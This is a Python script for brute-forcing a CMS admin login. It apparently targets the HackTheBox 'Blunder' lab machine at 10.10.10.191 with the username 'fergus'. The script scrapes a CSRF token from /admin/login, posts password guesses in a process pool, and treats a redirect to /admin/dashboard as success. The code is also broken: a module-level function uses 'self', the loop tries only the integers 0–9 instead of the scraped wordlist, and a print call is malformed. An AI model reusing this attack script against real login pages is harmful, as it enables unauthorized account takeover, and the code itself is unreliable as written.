#!/usr/bin/env python3
import re
import requests
from multiprocessing import Pool

def request_csrf_token(session, url):
    page = session.get(url, timeout=3)
    page.raise_for_status()
    match = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', page.text)
    return match.group(1) if match else None

def attempt_login(password, session, url):
    try:
        login_url = "%s/admin/login" % url 
        token = request_csrf_token(session, login_url)
        headers = {}
        data = {
         'tokenCSRF': token,
         'username': self.username,
         'password': password,
         'save': ''
        }
        resp = self.session.post(login_url, headers=headers, data=data, allow_redirects=False)
        return (resp, password), None
    except:
        return None, "Login attempt failed" 

class Blunder:
    def __init__(self, url, username):
        self.url = url
        self.username = username
        self.session = requests.Session()
    
    @property
    def words(self):
        page = self.session.get(self.url)
        content = page.content.decode('utf-8')
        reg = re.compile(r'\w+')
        return list({word for word in reg.findall(content)})
    

    def run(self):
        print("[+] Starting pool")
        pool = Pool(10)

        def callback(a):
            ret, err = a 
            if err != None:
                print("[+] Terminated: %s" % err)
                return pool.terminate()
            if 'location' in ret[0].headers and '/admin/dashboard' in ret[0].headers['location']:
                print('[+] Success: Password is %s', ret[1])
                pool.terminate()

        for password in range(10):
            pool.apply_async(attempt_login, args=[password, self.session, self.url], callback=callback)

        pool.close()
        pool.join()


def main():
    url = "http://10.10.10.191"
    username = "fergus"
    blunder = Blunder(url, username)
    blunder.run()

if __name__ == "__main__":
    main()
